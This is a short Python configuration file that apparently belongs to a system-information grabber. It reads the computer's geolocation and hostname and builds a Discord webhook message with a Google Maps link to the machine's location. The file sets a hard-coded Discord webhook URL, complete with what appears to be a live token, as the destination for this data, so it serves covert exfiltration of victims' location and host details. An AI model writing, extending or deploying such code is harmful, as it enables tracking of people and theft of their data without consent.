import geo
import user_info

latlng = geo.get_location()

# set default values
DEFAULT_COLOR = int("000000", 16)
DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1155245923958542406/9ACUH8lAu7vkwckvBi9IMQBDgx6H84C7vuALrlxc55inQduo1ACnPB9t6FFRol8JePOj"
USERNAME = f"{user_info.get_hostname()} | System Information"
IMAGE_URL = "https://cdn.discordapp.com/avatars/648508571734245376/a_04f5199ee21d38b6aac9cd7381675efe.jpeg"

# webhook configuration

WEBHOOK_TITLE = "Systen information"
WEBHOOK_DESCRIPTION = (
    f"[Computer Location]({geo.create_google_maps_link(latlng)}) :earth_africa:"
)

if __name__ == "__main__":
    print("Please run main.py")